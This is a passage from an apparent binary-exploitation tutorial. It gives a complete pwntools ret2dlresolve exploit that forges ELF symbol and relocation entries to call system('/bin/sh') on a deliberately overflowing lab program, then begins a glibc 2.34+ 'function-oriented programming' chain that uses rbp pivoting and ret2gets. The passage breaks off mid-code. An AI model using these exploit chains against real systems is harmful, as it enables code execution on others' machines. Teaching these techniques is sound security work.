<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reloc_arg </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addrof_rela </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> DT_JMPREL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">//</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x18</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="finishing-the-rop-chain">Finishing the rop chain<a href="#finishing-the-rop-chain" class="hash-link" aria-label="Direct link to Finishing the rop chain" title="Direct link to Finishing the rop chain">​</a></h4>
<p>Now that all the objects are constructed, we should be able to resolve the symbol using the dispatcher and <code>reloc_arg</code>. Last thing for our payload is we need a <code>/bin/sh</code> string, so we can add one onto the end of the blob:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 0x40414f</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;/bin/sh\x00&quot;</span><br></span></code></pre></div></div>
<p>And now complete the rop chain:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rop </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pop_rdi</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addrof_binsh</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dispatcher</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">reloc_arg</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>And send them off (in the correct order!):</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rop</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x200</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x200</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>When sending these, to prevent them from merging into the same <code>read</code> call, I padded them to 0x200 bytes. Normally you could use <code>p.sendafter()</code>, however nothing&#x27;s printed in this program. Another, slower way is to just use <code>time.sleep()</code> to separate them.</p></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="full-exploit">Full exploit<a href="#full-exploit" class="hash-link" aria-label="Direct link to Full exploit" title="Direct link to Full exploit">​</a></h4>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">e </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">binary </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;./vuln&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pop_rdi </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4011c3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pop_rsi_r15 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4011c1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dispatcher </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x401020</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DT_SYMTAB </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4003c0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DT_STRTAB </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x400420</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DT_JMPREL </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4004b8</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">writable </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x404100</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">addrof_sym </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> writable </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x10</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">addrof_rela </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> writable </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x30</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">addrof_st_name </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> writable </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x48</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">addrof_binsh </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> writable </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4f</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addrof_sym </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> DT_SYMTAB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x18</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addrof_rela </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> DT_JMPREL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x18</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 0x404100: padding</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x10</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 0x404110: Elf64_Sym</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addrof_st_name </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> DT_STRTAB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic"># st_name</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p8</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">		    </span><span class="token comment" style="color:#999988;font-style:italic"># st_info (global(0x10)|function(0x2))</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p8</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">		    </span><span class="token comment" style="color:#999988;font-style:italic"># st_other</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p16</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">		    </span><span class="token comment" style="color:#999988;font-style:italic"># st_shndx</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">        	</span><span class="token comment" style="color:#999988;font-style:italic"># st_value</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">		    </span><span class="token comment" style="color:#999988;font-style:italic"># st_size</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 0x404128: padding</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x8</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 0x404130: Elf64_Rela</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x404080</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># r_offset</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">7</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">           </span><span class="token comment" style="color:#999988;font-style:italic"># r_info.type</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addrof_sym </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> DT_SYMTAB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">//</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x18</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">   </span><span class="token comment" style="color:#999988;font-style:italic"># r_info.sym</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">           </span><span class="token comment" style="color:#999988;font-style:italic"># r_addend</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 0x404148: st_name</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;system\x00&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 0x40414f</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;/bin/sh\x00&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reloc_arg </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addrof_rela </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> DT_JMPREL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">//</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x18</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x80</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">   </span><span class="token comment" style="color:#999988;font-style:italic"># saved rbp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pop_rsi_r15</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">writable</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pop_rdi</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addrof_binsh</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dispatcher</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">reloc_arg</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rop</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x200</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x200</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="function-oriented-programming">Function-oriented programming<a href="#function-oriented-programming" class="hash-link" aria-label="Direct link to Function-oriented programming" title="Direct link to Function-oriented programming">​</a></h2>
<p>Now onto the first of the 2.34+ techniques. For this, we&#x27;ll extend the classic ret2dlresolve attack to resolve multiple functions; after all, nothing stops us creating multiple relocation and symbol objects +  chaining them together.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="attack-scenario">Attack scenario<a href="#attack-scenario" class="hash-link" aria-label="Direct link to Attack scenario" title="Direct link to Attack scenario">​</a></h3>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">vuln.c</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;unistd.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> buf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x200</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>Same program as before, except without <code>pop rdi ; ret</code>, so calling <code>system</code> on its own isn&#x27;t very useful (as <code>rdi=0</code> from the <code>read</code> call).</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="arbitrary-write">Arbitrary write<a href="#arbitrary-write" class="hash-link" aria-label="Direct link to Arbitrary write" title="Direct link to Arbitrary write">​</a></h3>
<p>Since we also don&#x27;t have <code>pop rsi ; pop r15 ; ret</code>, we can&#x27;t simply modify the buffer to point to writable memory. Instead, we can use our control over rbp to point <code>buf</code> to arbitrary addresses, then triggering the <code>read</code>. Read <a href="/pwn/rop-2.34+/controlling-rbp">here</a> for more.</p>
<figure><img src="/assets/image (10).png" alt=""><figcaption><p>Dissassembly of <code>main</code></p></figcaption></figure>
<p>Basically, when we return, <code>leave</code> is triggered, which pops the saved base pointer into <code>rbp</code>, which we overwrite with our overflow. Then we can jump to <code>main+8</code> (<code>0x40112e</code>), which loads <code>[rbp-0x80]</code> into <code>rax</code>, then into <code>rsi</code>. So if we wanted to write to some address, say <code>0x400c00</code>, we could do:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rop  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;a&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x80</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x404c00</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x40112e</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>Keep in mind that this will stack pivot to the binary&#x27;s writable section, so we&#x27;ll need to write a rop chain for when we return again, along with the ret2dlresolve objects, and leave enough space for the function calls.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ret2gets-payload">ret2gets payload<a href="#ret2gets-payload" class="hash-link" aria-label="Direct link to ret2gets payload" title="Direct link to ret2gets payload">​</a></h3>
<p>So now that we can write to the binary&#x27;s memory, what rop chain should we aim to construct. We can only chain together function calls, however this can be enough. For example, we can once again employ <del>my</del> our beloved <a href="/pwn/rop-2.34+/ret2gets#controlling-rdi">ret2gets</a>!</p>
<p>We&#x27;ll use the variant which allows for <code>rdi</code> control, then call <code>system</code> afterwards, however before we can call <code>gets</code>, we need a writable address in <code>rdi</code> first. Since <code>rdi = 0</code>, we can actually <a href="/pwn/rop-2.34+/ret2gets#case-3-rdi-null">call printf</a> to put <code>_IO_2_1_stdout_</code> into <code>rdi</code>.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rop </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;printf&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># -&gt; rdi = _IO_2_1_stdout_</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;gets&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic"># -&gt; rdi = _IO_stdfile_0_lock</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;gets&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic"># -&gt; rdi = _IO_stdfile_0_lock -&gt; &quot;/bin/sh&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;system&quot;</span><span class="token punctuation" 